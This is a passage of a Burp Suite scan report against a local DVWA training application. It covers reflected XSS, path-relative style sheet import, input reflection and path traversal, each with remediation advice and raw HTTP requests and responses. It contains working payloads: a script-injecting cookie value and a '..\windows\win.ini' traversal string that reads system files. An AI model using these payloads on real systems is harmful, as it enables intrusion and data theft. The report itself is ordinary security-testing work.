<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:08 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5322<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVW<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="22.2">22.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#22.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#22.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/exec/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>md3so'&gt;&lt;script&gt;alert(1)&lt;/script&gt;gjv13</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/exec/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">md3so'%3e%3cscript%3ealert(1)%3c%2fscript%3egjv13</span>; PHPSESSID=cj2n8quboom16mtjovt07b2262<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:36:42 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=cj2n8quboom16mtjovt07b2262; path=/<br>Set-Cookie: security=low<br>Content-Length: 4241<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVW<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=exec&amp;security=low<span class="HIGHLIGHT">md3so'&gt;&lt;script&gt;alert(1)&lt;/script&gt;gjv13</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="22.3">22.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#22.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#22.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/exec/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/exec/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=cj2n8quboom16mtjovt07b2262<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:53 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4075<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVW<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/exec/<span class="HIGHLIGHT">index.php/ifpu0i/b2qelx/db4s8a/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=cj2n8quboom16mtjovt07b2262<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:36:44 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4075<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVW<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/exec/index.php/ifpu0i/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=cj2n8quboom16mtjovt07b2262<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:36:44 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4075<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVW<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="22.4">22.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#22.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.1">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#22.4.1">/dvwa/vulnerabilities/exec/ [ip parameter]</a></li>
<li><a href="#22.4.2">/dvwa/vulnerabilities/exec/ [security cookie]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="22.4.1">22.4.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/exec/ [ip parameter]</span>
<br><a class="PREVNEXT" href="#19.4.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#22.4.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/exec/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>ip</b> request parameter is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/exec/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=c7cdvpm399l3cfpurfjl5o91db<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/exec/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 23<br><br>ip=493399<span class="HIGHLIGHT">5pyh2papzu</span>&amp;Submit=Submit</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:22 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4174<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVW<br><b>...[SNIP]...</b><br>&lt;pre&gt;Ping request could not find host 493399<span class="HIGHLIGHT">5pyh2papzu</span>. Please check the name and try again.<br>&lt;/pre&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="22.4.2">22.4.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/exec/ [security cookie]</span>
<br><a class="PREVNEXT" href="#22.4.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.5.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/exec/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/exec/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">ryc1y508o2</span>; PHPSESSID=cj2n8quboom16mtjovt07b2262<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:36:42 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=cj2n8quboom16mtjovt07b2262; path=/<br>Set-Cookie: security=low<br>Content-Length: 4187<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVW<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=exec&amp;security=low<span class="HIGHLIGHT">ryc1y508o2</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=exec&amp;security=low<span class="HIGHLIGHT">ryc1y508o2</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="23">23.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/</span>
<br><a class="PREVNEXT" href="#22">Previous</a>
&nbsp;<a class="PREVNEXT" href="#24">Next</a>
<br>
<span class="BODH1" id="23.1">23.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00100300_filepathtraversal">File path traversal</a></span>
<br><a class="PREVNEXT" href="#22.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>page</b> parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.<br><br>The payload <b>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini</b> was submitted in the page parameter. The requested file was returned in the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>File path traversal vulnerabilities arise when user-controllable data is used within a filesystem operation in an unsafe manner. Typically, a user-supplied filename is appended to a directory prefix in order to read or write the contents of a file. If vulnerable, an attacker can supply path traversal sequences (using dot-dot-slash characters) to break out of the intended directory and read or write files elsewhere on the filesystem.</p>
<p>This is typically a very serious vulnerability, enabling an attacker to access sensitive files containing configuration data, passwords, database records, log data, source code, and program scripts and binaries. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be passed to filesystem operations. This can normally be achieved by referencing known files via an index number rather than their name, and using application-generated filenames to save user-supplied file content.</p>
<p>If it is considered unavoidable to pass user-controllable data to a filesystem operation, three layers of defense can be employed to prevent path traversal attacks: </p>
<ul><li>User-controllable data should be strictly validated before being passed to any filesystem operation. In particular, input containing dot-dot sequences should be blocked.</li><li>After validating user input, the application can use a suitable filesystem API to verify that the file to be accessed is actually located within the base directory used by the application. In Java, this can be achieved by instantiating a java.io.File object using the user-supplied filename and then calling the getCanonicalPath method on this object. If the string returned by this method does not begin with the name of the start directory, then the user has somehow bypassed the application's input filters, and the request should be rejected. In ASP.NET, the same check can be performed by passing the user-supplied filename to the System.Io.Path.GetFullPath method and checking the returned string in the same way as described for Java.</li><li>The directory used to store files that are accessed using user-controllable data can be located on a separate logical volume to other sensitive application and operating system files, so that these cannot be reached via path traversal attacks. In Unix-based systems, this can be achieved using a chrooted filesystem; on Windows, this can be achieved by mounting the base directory as a new logical drive and using the associated drive letter to access its contents.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/file-path-traversal">Web Security Academy: Directory traversal</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
